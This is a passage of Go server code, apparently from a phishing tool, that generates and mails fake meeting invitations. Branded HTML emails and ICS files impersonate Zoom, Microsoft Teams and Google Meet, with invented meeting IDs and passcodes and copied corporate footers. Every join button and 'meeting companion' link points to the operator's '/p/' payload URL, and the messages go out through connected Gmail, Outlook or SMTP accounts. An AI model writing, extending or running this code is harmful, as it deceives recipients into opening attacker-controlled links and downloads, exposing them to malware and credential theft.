	}
	if req.Disguise == "" {
		req.Disguise = "auto"
	}
	startDt, err := time.Parse(time.RFC3339, req.StartISO)
	if err != nil {
		startDt, err = time.ParseInLocation("2006-01-02T15:04", req.StartISO, time.UTC)
		if err != nil {
			http.Error(w, "invalid start time", http.StatusBadRequest)
			return
		}
	}

	baseURL := h.resolveBaseURL(r)

	// Try OAuth providers first (Google, then Microsoft)
	for _, provider := range []string{"google", "microsoft"} {
		tok, err := h.validToken(provider)
		if err != nil || tok == nil {
			continue
		}
		fromEmail := tok.Email
		fromName := req.FromName
		if fromName == "" {
			fromName = fromEmail
		}
		smartURL := baseURL + "/p/" + req.Preset
		effDisguise := req.Disguise
		if effDisguise == "auto" {
			if d, ok := presetDisguises[req.Preset]; ok {
				effDisguise = d
			} else {
				effDisguise = "generic"
			}
		}
		icsContent := buildICS(req.Preset, fromName, fromEmail, req.ToEmails,
			req.Subject, startDt, req.DurationMin, req.Disguise, baseURL)
		htmlBody := buildInviteHTML(effDisguise, req.Subject, smartURL, fromName)
		mimeMsg := buildCalendarEmail(fromName, fromEmail, req.ToEmails, req.Subject, htmlBody, icsContent)

		var sendErr error
		switch provider {
		case "google":
			sendErr = sendViaGmail(tok, mimeMsg)
		case "microsoft":
			sendErr = sendViaMicrosoft(tok, mimeMsg)
		}
		if sendErr != nil {
			log.Printf("[invite] %s send failed: %v", provider, sendErr)
			http.Error(w, "send failed: "+sendErr.Error(), http.StatusBadGateway)
			return
		}
		log.Printf("[invite] sent via %s as %s preset=%s to=%v", provider, fromEmail, req.Preset, req.ToEmails)
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"ok":true}`))
		return
	}

	// Fall back to SMTP
	cfg, err := h.loadEmailConfig()
	if err != nil || cfg.SMTPUser == "" || cfg.SMTPPass == "" {
		http.Error(w, "no email provider connected — sign in with Gmail or Outlook, or configure SMTP", http.StatusBadRequest)
		return
	}
	smtpSmartURL := baseURL + "/p/" + req.Preset
	smtpDisguise := req.Disguise
	if smtpDisguise == "auto" {
		if d, ok := presetDisguises[req.Preset]; ok {
			smtpDisguise = d
		} else {
			smtpDisguise = "generic"
		}
	}
	icsContent := buildICS(req.Preset, cfg.FromName, cfg.FromEmail, req.ToEmails,
		req.Subject, startDt, req.DurationMin, req.Disguise, baseURL)
	smtpHTML := buildInviteHTML(smtpDisguise, req.Subject, smtpSmartURL, cfg.FromName)
	if err := sendCalendarInvite(*cfg, req.ToEmails, req.Subject, smtpHTML, icsContent); err != nil {
		log.Printf("[invite] smtp send failed: %v", err)
		http.Error(w, "send failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	log.Printf("[invite] sent via smtp preset=%s to=%v", req.Preset, req.ToEmails)
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"ok":true}`))
}

// ── ICS generation ─────────────────────────────────────────────────────────────

func icsRandDigits(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = '0' + b[i]%10
	}
	return string(b)
}

func icsRandLetters(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = 'a' + b[i]%26
	}
	return string(b)
}

func icsNewUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func escICS(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, ";", `\;`)
	s = strings.ReplaceAll(s, ",", `\,`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	return s
}

func foldICS(line string) string {
	if len(line) <= 75 {
		return line
	}
	var out strings.Builder
	for len(line) > 0 {
		if len(line) <= 75 {
			out.WriteString(line)
			break
		}
		i := 75
		for i > 0 && line[i]&0xC0 == 0x80 {
			i--
		}
		out.WriteString(line[:i])
		out.WriteString("\r\n ")
		line = line[i:]
	}
	return out.String()
}

func buildICSDescription(disguise, subject, smartURL, fromName string) string {
	zoomParts := icsRandDigits(3) + " " + icsRandDigits(4) + " " + icsRandDigits(4)
	zoomNum := strings.ReplaceAll(zoomParts, " ", "")
	passcode := strings.ToUpper(icsRandLetters(3)) + icsRandDigits(3)
	meetID := icsRandDigits(3) + " " + icsRandDigits(4) + " " + icsRandDigits(6) + " " + icsRandDigits(3)
	sep := "──────────────────────────"

	switch disguise {
	case "zoom":
		return strings.Join([]string{
			"You are invited to a Zoom meeting.",
			"",
			"Topic: " + subject,
			"",
			"Join Zoom Meeting",
			"https://zoom.us/j/" + zoomNum + "?pwd=" + passcode,
			"",
			"Meeting ID: " + zoomParts,
			"Passcode: " + passcode,
			"",
			sep,
			"Pre-meeting materials:",
			smartURL,
			sep,
			"",
			"One tap mobile: +16699006833,," + zoomNum + "# US (San Jose)",
		}, "\n")
	case "teams":
		encoded := base64.StdEncoding.EncodeToString([]byte(subject))
		safe := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(encoded, "")
		return strings.Join([]string{
			"Microsoft Teams meeting",
			"",
			"Join on your computer or mobile app",
			"https://teams.microsoft.com/l/meetup-join/19:meeting_" + safe + "@thread.v2/0",
			"",
			"Meeting ID: " + meetID,
			"Passcode: " + passcode,
			"",
			sep,
			"Download meeting companion:",
			smartURL,
			sep,
		}, "\n")
	case "google-meet":
		code := icsRandLetters(3) + "-" + icsRandLetters(4) + "-" + icsRandLetters(3)
		return strings.Join([]string{
			"Video call link: https://meet.google.com/" + code,
			"",
			"Or dial: (US) +1 " + icsRandDigits(3) + "-" + icsRandDigits(3) + "-" + icsRandDigits(4),
			"PIN: " + icsRandDigits(7) + "#",
			"",
			sep,
			"Meeting materials:",
			smartURL,
			sep,
		}, "\n")
	default:
		return strings.Join([]string{
			"Please review the attached document before our meeting.",
			"",
			"Topic: " + subject,
			"",
			"Access materials here:",
			smartURL,
			"",
			sep,
			"This invitation was sent by " + fromName,
		}, "\n")
	}
}

func buildICS(preset, fromName, fromEmail string, toEmails []string, subject string,
	startDt time.Time, durationMin int, disguise, baseURL string) string {

	endDt := startDt.Add(time.Duration(durationMin) * time.Minute)
	smartURL := baseURL + "/p/" + preset

	domain := "calendar.invite"
	if parts := strings.SplitN(fromEmail, "@", 2); len(parts) == 2 {
		domain = parts[1]
	}
	uid := icsNewUID() + "@" + domain

	effDisguise := disguise
	if disguise == "auto" {
		if d, ok := presetDisguises[preset]; ok {
			effDisguise = d
		} else {
			effDisguise = "generic"
		}
	}

	desc := buildICSDescription(effDisguise, subject, smartURL, fromName)
	dtFmt := func(t time.Time) string { return t.UTC().Format("20060102T150405Z") }

	lines := []string{
		"BEGIN:VCALENDAR",
		"VERSION:2.0",
		"PRODID:-//Google Inc//Google Calendar 70.9054//EN",
		"CALSCALE:GREGORIAN",
		"METHOD:REQUEST",
		"BEGIN:VEVENT",
		foldICS("UID:" + uid),
		"DTSTART:" + dtFmt(startDt),
		"DTEND:" + dtFmt(endDt),
		foldICS(`ORGANIZER;CN="` + escICS(fromName) + `":mailto:` + fromEmail),
	}
	for _, to := range toEmails {
		lines = append(lines, foldICS(
			"ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;"+
				"PARTSTAT=NEEDS-ACTION;RSVP=TRUE;CN="+to+":mailto:"+to,
		))
	}
	lines = append(lines,
		foldICS("SUMMARY:"+escICS(subject)),
		foldICS("DESCRIPTION:"+escICS(desc)),
		foldICS("ATTACH;VALUE=URI:"+smartURL),
		"END:VEVENT",
		"END:VCALENDAR",
	)
	return strings.Join(lines, "\r\n") + "\r\n"
}

// ── SMTP ───────────────────────────────────────────────────────────────────────

// buildCalendarEmail creates a multipart/mixed email: HTML body with meeting
// details + ICS as a downloadable attachment. The ICS uses application/ics so
// it renders as a file in Gmail rather than being silently consumed as calendar
// data (which causes blank emails on self-sends and strips the body).
func buildCalendarEmail(fromName, fromEmail string, to []string, subject, htmlBody, icsContent string) []byte {
	b := make([]byte, 12)
	rand.Read(b)
	boundary := "----=_BB_Cal_" + hex.EncodeToString(b)

	htmlB64 := b64fold([]byte(htmlBody))
	icsB64 := b64fold([]byte(icsContent))

	var buf bytes.Buffer
	buf.WriteString("From: " + fromName + " <" + fromEmail + ">\r\n")
	buf.WriteString("To: " + strings.Join(to, ", ") + "\r\n")
	buf.WriteString("Subject: " + subject + "\r\n")
	buf.WriteString("MIME-Version: 1.0\r\n")
	buf.WriteString("Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n\r\n")

	buf.WriteString("--" + boundary + "\r\n")
	buf.WriteString("Content-Type: text/html; charset=utf-8\r\n")
	buf.WriteString("Content-Transfer-Encoding: base64\r\n\r\n")
	buf.WriteString(htmlB64)
	buf.WriteString("\r\n")

	buf.WriteString("--" + boundary + "\r\n")
	buf.WriteString("Content-Type: application/ics; name=\"invite.ics\"\r\n")
	buf.WriteString("Content-Disposition: attachment; filename=\"invite.ics\"\r\n")
	buf.WriteString("Content-Transfer-Encoding: base64\r\n\r\n")
	buf.WriteString(icsB64)
	buf.WriteString("\r\n")

	buf.WriteString("--" + boundary + "--\r\n")
	return buf.Bytes()
}

func buildInviteHTML(disguise, subject, smartURL, fromName string) string {
	zoomID := icsRandDigits(3) + " " + icsRandDigits(4) + " " + icsRandDigits(4)
	zoomNum := strings.ReplaceAll(zoomID, " ", "")
	passcode := strings.ToUpper(icsRandLetters(3)) + icsRandDigits(3)
	meetID := icsRandDigits(3) + " " + icsRandDigits(4) + " " + icsRandDigits(6) + " " + icsRandDigits(3)
	meetCode := icsRandLetters(3) + "-" + icsRandLetters(4) + "-" + icsRandLetters(3)
	phone := "+1 " + icsRandDigits(3) + "-" + icsRandDigits(3) + "-" + icsRandDigits(4)
	pin := icsRandDigits(9)

	wrap := func(header, body, footer string) string {
		return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>` +
			`<body style="margin:0;padding:0;background:#f0f0f0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif">` +
			`<div style="max-width:600px;margin:0 auto;background:#ffffff;border-radius:4px;overflow:hidden;margin-top:24px;margin-bottom:24px;box-shadow:0 1px 4px rgba(0,0,0,.12)">` +
			header + body + footer + `</div></body></html>`
	}

	btn := func(color, text, href string) string {
		return fmt.Sprintf(
			`<a href="%s" style="display:inline-block;background:%s;color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;padding:12px 28px;border-radius:4px;letter-spacing:.2px">%s</a>`,
			href, color, text)
	}

	detailBox := func(rows string) string {
		return `<div style="background:#f8f8f8;border:1px solid #e8e8e8;border-radius:6px;padding:16px 20px;margin:20px 0;font-size:13px;color:#3d3d3d;line-height:2">` + rows + `</div>`
	}

	materialsRow := func(label, href string) string {
		return fmt.Sprintf(
			`<div style="margin-top:20px;padding-top:16px;border-top:1px solid #ebebeb;font-size:13px;color:#666">%s<br>`+
				`<a href="%s" style="color:#1a73e8;word-break:break-all">%s</a></div>`,
			label, href, href)
	}

	footer := func(copyright string) string {
		return `<div style="background:#f8f8f8;border-top:1px solid #ebebeb;padding:16px 32px;font-size:11px;color:#999;line-height:1.6">` +
			copyright + `</div>`
	}

	switch disguise {
	case "zoom":
		header := `<div style="background:#2D8CFF;padding:22px 32px">` +
			`<span style="font-size:26px;font-weight:700;color:#ffffff;letter-spacing:-.5px">zoom</span>` +
			`</div>`
		body := `<div style="padding:32px">` +
			`<p style="margin:0 0 4px;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:#2D8CFF">Zoom Meeting</p>` +
			`<h1 style="margin:0 0 6px;font-size:22px;font-weight:600;color:#1f1f1f">` + subject + `</h1>` +
			`<p style="margin:0 0 24px;font-size:14px;color:#747487">Organized by ` + fromName + `</p>` +
			btn("#2D8CFF", "Join Zoom Meeting", smartURL) +
			detailBox(
				`<b>Meeting ID:</b> `+zoomID+`<br>`+
					`<b>Passcode:</b> `+passcode+`<br>`+
					`<b>One tap mobile:</b> `+phone+`,,`+zoomNum+`# (US)`) +
			materialsRow("Pre-meeting materials:", smartURL) +
			`</div>`
		return wrap(header, body, footer("© 2026 Zoom Video Communications, Inc. All rights reserved."))

	case "teams":
		header := `<div style="background:#6264A7;padding:22px 32px;display:flex;align-items:center;gap:12px">` +
			`<span style="font-size:20px;font-weight:700;color:#ffffff">Microsoft Teams</span>` +
			`</div>`
		body := `<div style="padding:32px">` +
			`<p style="margin:0 0 4px;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:#6264A7">Teams Meeting</p>` +
			`<h1 style="margin:0 0 6px;font-size:22px;font-weight:600;color:#1f1f1f">` + subject + `</h1>` +
			`<p style="margin:0 0 24px;font-size:14px;color:#605e5c">Organized by ` + fromName + `</p>` +
			btn("#6264A7", "Join Microsoft Teams Meeting", smartURL) +
			`<p style="margin:16px 0 4px;font-size:13px;color:#605e5c">Or join with a meeting ID</p>` +
			detailBox(
				`<b>Meeting ID:</b> `+meetID+`<br>`+
					`<b>Passcode:</b> `+passcode) +
			materialsRow("Download meeting companion:", smartURL) +
			`</div>`
		return wrap(header, body, footer("Microsoft Corporation · One Microsoft Way, Redmond, WA 98052"))

	case "google-meet":
		header := `<div style="background:#ffffff;padding:20px 32px;border-bottom:1px solid #ebebeb;display:flex;align-items:center;gap:8px">` +
			`<span style="font-size:18px;font-weight:400;color:#5f6368;letter-spacing:-.3px">` +
			`<span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC04">o</span>` +
			`<span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>` +
			` Meet</span></div>`
		body := `<div style="padding:32px">` +
			`<h1 style="margin:0 0 6px;font-size:22px;font-weight:400;color:#202124">` + subject + `</h1>` +
			`<p style="margin:0 0 24px;font-size:14px;color:#5f6368">Organized by ` + fromName + `</p>` +
			btn("#1a73e8", "Join with Google Meet", smartURL) +
			detailBox(
				`<b>Video call link:</b> <a href="`+smartURL+`" style="color:#1a73e8">`+smartURL+`</a><br>`+
					`<b>Dial in:</b> `+phone+`<br>`+
					`<b>PIN:</b> `+pin+`#`) +
			materialsRow("Meeting materials:", smartURL) +
			`</div>`
		return wrap(header, body, footer("Google LLC · 1600 Amphitheatre Pkwy, Mountain View, CA 94043"))

	default: // generic
		header := `<div style="background:#1a1a2e;padding:22px 32px">` +
			`<span style="font-size:16px;font-weight:600;color:#ffffff">Meeting Invitation</span>` +
			`</div>`
		body := `<div style="padding:32px">` +
			`<h1 style="margin:0 0 6px;font-size:22px;font-weight:600;color:#1f1f1f">` + subject + `</h1>` +
			`<p style="margin:0 0 24px;font-size:14px;color:#666">Organized by ` + fromName + `</p>` +
			btn("#1a1a2e", "Join Meeting", smartURL) +
			detailBox(`<b>Meeting code:</b> `+meetCode+`<br><b>Passcode:</b> `+passcode) +
			materialsRow("Access meeting materials:", smartURL) +
			`</div>`
		return wrap(header, body, footer("This invitation was sent by "+fromName+". Please do not reply to this email."))
	}
}

func b64fold(data []byte) string {
	s := base64.StdEncoding.EncodeToString(data)
	var out strings.Builder
	for len(s) > 76 {
		out.WriteString(s[:76])
		out.WriteString("\r\n")
		s = s[76:]
	}
	out.WriteString(s)
	out.WriteString("\r\n")
	return out.String()
}

func sendCalendarInvite(cfg EmailConfig, to []string, subject, htmlBody, icsContent string) error {
	addr := fmt.Sprintf("%s:%d", cfg.SMTPHost, cfg.SMTPPort)
	auth := smtp.PlainAuth("", cfg.SMTPUser, cfg.SMTPPass, cfg.SMTPHost)
	msg := buildCalendarEmail(cfg.FromName, cfg.FromEmail, to, subject, htmlBody, icsContent)
	return smtp.SendMail(addr, auth, cfg.FromEmail, to, msg)
}

// ── OAuth ──────────────────────────────────────────────────────────────────────

type OAuthAppCreds struct {
	GoogleClientID        string `json:"google_client_id,omitempty"`
	GoogleClientSecret    string `json:"google_client_secret,omitempty"`
	MicrosoftClientID     string `json:"microsoft_client_id,omitempty"`
	MicrosoftClientSecret string `json:"microsoft_client_secret,omitempty"`
}

type OAuthToken struct {
	AccessToken  string    `json:"access_token"`
	RefreshToken string    `json:"refresh_token"`
	Expiry       time.Time `json:"expiry"`
	Email        string    `json:"email"`
}

func (h *Handler) oauthCredsPath() string {
	return filepath.Join(h.dataDir, "oauth_creds.json.enc")
}
func (h *Handler) oauthTokenPath(provider string) string {
	return filepath.Join(h.dataDir, "oauth_token_"+provider+".json.enc")
}

func (h *Handler) loadOAuthCreds() (*OAuthAppCreds, error) {
	data, err := os.ReadFile(h.oauthCredsPath())
	if err != nil {
		if os.IsNotExist(err) {
			return &OAuthAppCreds{}, nil
		}
		return nil, err
	}
	plain, err := decrypt(h.encKey, data)
	if err != nil {
		return nil, err
	}
	var c OAuthAppCreds
	return &c, json.Unmarshal(plain, &c)
}

func (h *Handler) saveOAuthCreds(c *OAuthAppCreds) error {
	data, _ := json.Marshal(c)
	enc, err := encrypt(h.encKey, data)
	if err != nil {
		return err
	}
	return os.WriteFile(h.oauthCredsPath(), enc, 0600)
}

func (h *Handler) loadOAuthToken(provider string) (*OAuthToken, error) {
	data, err := os.ReadFile(h.oauthTokenPath(provider))
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, err
	}
	plain, err := decrypt(h.encKey, data)
	if err != nil {
		return nil, err
	}
	var t OAuthToken
	return &t, json.Unmarshal(plain, &t)
}

func (h *Handler) saveOAuthToken(provider string, t *OAuthToken) error {
	data, _ := json.Marshal(t)
	enc, err := encrypt(h.encKey, data)
	if err != nil {
		return err
	}
	return os.WriteFile(h.oauthTokenPath(provider), enc, 0600)
}

func (h *Handler) deleteOAuthToken(provider string) {
	os.Remove(h.oauthTokenPath(provider))
}

// genOAuthState produces a CSRF-proof state value using HMAC over random bytes.
// No server-side storage needed — verified in the callback by re-computing HMAC.
func (h *Handler) genOAuthState() string {
	b := make([]byte, 16)
	rand.Read(b)
	mac := hmac.New(sha256.New, []byte(h.apiKey))
	mac.Write(b)
	return hex.EncodeToString(b) + hex.EncodeToString(mac.Sum(nil)[:8])
}

func (h *Handler) verifyOAuthState(state string) bool {
	if len(state) != 48 {
		return false
	}
	b, err := hex.DecodeString(state[:32])
	if err != nil {
		return false
	}
	mac := hmac.New(sha256.New, []byte(h.apiKey))
	mac.Write(b)
	expected := hex.EncodeToString(mac.Sum(nil)[:8])
	return hmac.Equal([]byte(state[32:]), []byte(expected))
}

// validToken loads the stored token for provider, refreshing it if expired.
func (h *Handler) validToken(provider string) (*OAuthToken, error) {
	tok, err := h.loadOAuthToken(provider)
	if err != nil || tok == nil {
		return nil, err
	}
	if time.Now().Before(tok.Expiry) {
		return tok, nil
	}
	// Refresh
	creds, err := h.loadOAuthCreds()
	if err != nil {
		return nil, err
	}
	var tokenURL, clientID, clientSecret string
	switch provider {
	case "google":
		tokenURL = "https://oauth2.googleapis.com/token"
		clientID, clientSecret = creds.GoogleClientID, creds.GoogleClientSecret
	case "microsoft":
		tokenURL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
		clientID, clientSecret = creds.MicrosoftClientID, creds.MicrosoftClientSecret
	}
	newTok, err := oauthRefresh(tokenURL, clientID, clientSecret, tok.RefreshToken)
	if err != nil {
		h.deleteOAuthToken(provider)
		return nil, fmt.Errorf("token refresh: %w", err)
	}
	newTok.Email = tok.Email
	h.saveOAuthToken(provider, newTok)
	return newTok, nil
}

func oauthRefresh(tokenURL, clientID, clientSecret, refreshToken string) (*OAuthToken, error) {
	resp, err := http.PostForm(tokenURL, url.Values{
		"grant_type":    {"refresh_token"},
		"refresh_token": {refreshToken},
		"client_id":     {clientID},
		"client_secret": {clientSecret},
	})
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, body)
	}
	var r struct {
		AccessToken  string `json:"access_token"`
		RefreshToken string `json:"refresh_token"`
		ExpiresIn    int    `json:"expires_in"`
	}
	if err := json.Unmarshal(body, &r); err != nil {
		return nil, err
	}
	tok := &OAuthToken{
		AccessToken:  r.AccessToken,
		RefreshToken: refreshToken,
		Expiry:       time.Now().Add(time.Duration(r.ExpiresIn-60) * time.Second),
	}
	if r.RefreshToken != "" {
		tok.RefreshToken = r.RefreshToken
	}
	return tok, nil
}

// handleAuth routes /auth/* requests
func (h *Handler) handleAuth(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/auth/")
	parts := strings.SplitN(path, "/", 2)
	provider := parts[0]
	action := ""
	if len(parts) == 2 {
		action = parts[1]
	}

	switch provider {
	case "status":
		h.handleAuthStatus(w, r)
		return
	case "config":
		h.handleAuthConfig(w, r)
		return
	case "google", "microsoft":
	default:
		http.NotFound(w, r)
		return
	}

	switch action {
	case "":
		h.handleAuthConnect(provider, w, r)
	case "callback":
		h.handleAuthCallback(provider, w, r)
	case "disconnect":
		h.handleAuthDisconnect(provider, w, r)
	default:
		http.NotFound(w, r)
	}
}

func (h *Handler) handleAuthConfig(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	switch r.Method {
	case http.MethodGet:
		creds, err := h.loadOAuthCreds()
		if err != nil {
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}
		masked := *creds
		if masked.GoogleClientSecret != "" {
			masked.GoogleClientSecret = "••••••••"
		}
		if masked.MicrosoftClientSecret != "" {
			masked.MicrosoftClientSecret = "••••••••"
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(masked)

	case http.MethodPost:
		var incoming OAuthAppCreds
		if err := json.NewDecoder(r.Body).Decode(&incoming); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		existing, _ := h.loadOAuthCreds()
		if existing == nil {
			existing = &OAuthAppCreds{}
		}
		if incoming.GoogleClientSecret == "••••••••" {
			incoming.GoogleClientSecret = existing.GoogleClientSecret
		}
		if incoming.MicrosoftClientSecret == "••••••••" {
			incoming.MicrosoftClientSecret = existing.MicrosoftClientSecret
		}
		if err := h.saveOAuthCreds(&incoming); err != nil {
			http.Error(w, "save failed", http.StatusInternalServerError)
			return
		}
		log.Printf("[auth] app credentials saved")
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"ok":true}`))

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *Handler) handleAuthStatus(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	creds, _ := h.loadOAuthCreds()
	if creds == nil {
		creds = &OAuthAppCreds{}
	}
	type PS struct {
		Connected  bool   `json:"connected"`
		Email      string `json:"email,omitempty"`
		HasAppCred bool   `json:"has_app_cred"`
	}
	googleTok, _ := h.loadOAuthToken("google")
	msTok, _ := h.loadOAuthToken("microsoft")
	status := map[string]PS{
		"google": {
			Connected:  googleTok != nil,
			Email:      func() string { if googleTok != nil { return googleTok.Email }; return "" }(),
			HasAppCred: creds.GoogleClientID != "" && creds.GoogleClientSecret != "",
		},
		"microsoft": {
			Connected:  msTok != nil,
			Email:      func() string { if msTok != nil { return msTok.Email }; return "" }(),
			HasAppCred: creds.MicrosoftClientID != "" && creds.MicrosoftClientSecret != "",
		},
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(status)
}

func (h *Handler) handleAuthConnect(provider string, w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	creds, err := h.loadOAuthCreds()
	if err != nil || creds == nil {
		http.Error(w, "OAuth app credentials not configured", http.StatusBadRequest)
		return
	}
	state := h.genOAuthState()
	redirectURI := h.resolveBaseURL(r) + "/auth/" + provider + "/callback"

	var authURL string
	switch provider {
	case "google":
		if creds.GoogleClientID == "" {
			http.Error(w, "Google client ID not configured", http.StatusBadRequest)
			return
		}
		authURL = "https://accounts.google.com/o/oauth2/v2/auth?" + url.Values{
			"client_id":     {creds.GoogleClientID},
			"redirect_uri":  {redirectURI},
			"response_type": {"code"},
			"scope":         {"openid email https://www.googleapis.com/auth/gmail.send"},
			"access_type":   {"offline"},
			"prompt":        {"consent"},
			"state":         {state},
		}.Encode()
	case "microsoft":
		if creds.MicrosoftClientID == "" {
			http.Error(w, "Microsoft client ID not configured", http.StatusBadRequest)
			return
		}
		authURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" + url.Values{
			"client_id":     {creds.MicrosoftClientID},
			"redirect_uri":  {redirectURI},
			"response_type": {"code"},
			"scope":         {"openid email https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access"},
			"state":         {state},
		}.Encode()
	}
	http.Redirect(w, r, authURL, http.StatusSeeOther)
}

// handleAuthCallback is intentionally unauthenticated — the provider redirects here.
// CSRF is handled by the HMAC state parameter.
func (h *Handler) handleAuthCallback(provider string, w http.ResponseWriter, r *http.Request) {
	if errMsg := r.URL.Query().Get("error"); errMsg != "" {
		http.Error(w, "OAuth error: "+errMsg, http.StatusBadRequest)
		return
	}
	if !h.verifyOAuthState(r.URL.Query().Get("state")) {
		http.Error(w, "invalid state", http.StatusBadRequest)
		return
	}
	code := r.URL.Query().Get("code")
	if code == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}
	creds, err := h.loadOAuthCreds()
	if err != nil || creds == nil {
		http.Error(w, "OAuth not configured", http.StatusInternalServerError)
		return
	}
	redirectURI := h.resolveBaseURL(r) + "/auth/" + provider + "/callback"

	var tokenURL, clientID, clientSecret, userInfoURL string
	switch provider {
	case "google":
		tokenURL = "https://oauth2.googleapis.com/token"
		clientID, clientSecret = creds.GoogleClientID, creds.GoogleClientSecret
		userInfoURL = "https://www.googleapis.com/oauth2/v3/userinfo"
	case "microsoft":
		tokenURL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
		clientID, clientSecret = creds.MicrosoftClientID, creds.MicrosoftClientSecret
		userInfoURL = "https://graph.microsoft.com/v1.0/me"
	}

	// Exchange code for tokens
	params := url.Values{
		"grant_type":   {"authorization_code"},
		"code":         {code},
		"redirect_uri": {redirectURI},
		"client_id":    {clientID},
		"client_secret": {clientSecret},
	}
	if provider == "microsoft" {
		params.Set("scope", "openid email https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access")
	}
	resp, err := http.PostForm(tokenURL, params)
	if err != nil {
		http.Error(w, "token exchange failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		log.Printf("[auth] token exchange failed for %s: %s", provider, body)
		http.Error(w, "token exchange failed", http.StatusBadGateway)
		return
	}
	var tokenResp struct {
		AccessToken  string `json:"access_token"`
		RefreshToken string `json:"refresh_token"`
		ExpiresIn    int    `json:"expires_in"`
	}
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		http.Error(w, "token parse failed", http.StatusInternalServerError)
		return
	}
	tok := &OAuthToken{
		AccessToken:  tokenResp.AccessToken,
		RefreshToken: tokenResp.RefreshToken,
		Expiry:       time.Now().Add(time.Duration(tokenResp.ExpiresIn-60) * time.Second),
	}

	// Fetch connected account email
	req, _ := http.NewRequest("GET", userInfoURL, nil)
	req.Header.Set("Authorization", "Bearer "+tok.AccessToken)
	if infoResp, err := http.DefaultClient.Do(req); err == nil && infoResp.StatusCode == 200 {
		defer infoResp.Body.Close()
		infoBody, _ := io.ReadAll(infoResp.Body)
		var info struct {
			Email string `json:"email"`
			Mail  string `json:"mail"`
			UPN   string `json:"userPrincipalName"`
		}
		if json.Unmarshal(infoBody, &info) == nil {
			tok.Email = info.Email
			if tok.Email == "" {
				tok.Email = info.Mail
			}
			if tok.Email == "" {
				tok.Email = info.UPN
			}
		}
	}

	if err := h.saveOAuthToken(provider, tok); err != nil {
		http.Error(w, "token save failed", http.StatusInternalServerError)
		return
	}
	log.Printf("[auth] %s connected: %s", provider, tok.Email)
	http.Redirect(w, r, "/payloads", http.StatusSeeOther)
}

func (h *Handler) handleAuthDisconnect(provider string, w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}
	h.deleteOAuthToken(provider)
	log.Printf("[auth] %s disconnected", provider)
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"ok":true}`))
}

// ── OAuth send helpers ─────────────────────────────────────────────────────────

// sendViaGmail sends using the Gmail REST API.
// Gmail expects the raw RFC 2822 MIME message base64url-encoded.
func sendViaGmail(tok *OAuthToken, mimeMsg []byte) error {
	body, _ := json.Marshal(map[string]string{
		"raw": base64.RawURLEncoding.EncodeToString(mimeMsg),
	})
	req, err := http.NewRequest("POST",
		"https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
		bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+tok.AccessToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("gmail API %d: %s", resp.StatusCode, b)
	}
	return nil
}

// sendViaMicrosoft sends using the Graph API MIME upload endpoint.
// The raw MIME message is uploaded directly with Content-Type: text/plain,
// which preserves the text/calendar; method=REQUEST part needed for invite UI.
func sendViaMicrosoft(tok *OAuthToken, mimeMsg []byte) error {
	req, err := http.NewRequest("POST",
		"https://graph.microsoft.com/v1.0/me/sendMail",
		bytes.NewReader(mimeMsg))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+tok.AccessToken)
